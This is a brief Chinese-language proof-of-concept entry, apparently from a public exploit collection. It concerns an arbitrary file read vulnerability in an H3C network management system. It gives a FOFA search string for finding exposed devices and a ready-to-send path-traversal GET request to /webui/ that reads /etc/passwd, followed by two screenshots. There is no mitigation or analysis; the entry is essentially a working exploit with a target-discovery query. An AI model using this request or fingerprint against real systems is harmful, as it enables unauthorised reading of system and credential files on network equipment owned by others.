
## H3C网络管理系统任意文件读取漏洞

## fofa
```
body="webui/js/jquerylib/jquery-1.7.2.min.js"
```

## poc
```
GET /webui/?file_name=../../../../../etc/passwd&g=sys_dia_data_down HTTP/1.1

```
![image](https://github.com/wy876/POC/assets/139549762/e5bc6b46-2181-4d89-bab2-b6c1e2db7bca)

![image](https://github.com/wy876/POC/assets/139549762/d94b6fad-82fa-49d5-b236-c3a148380aca)
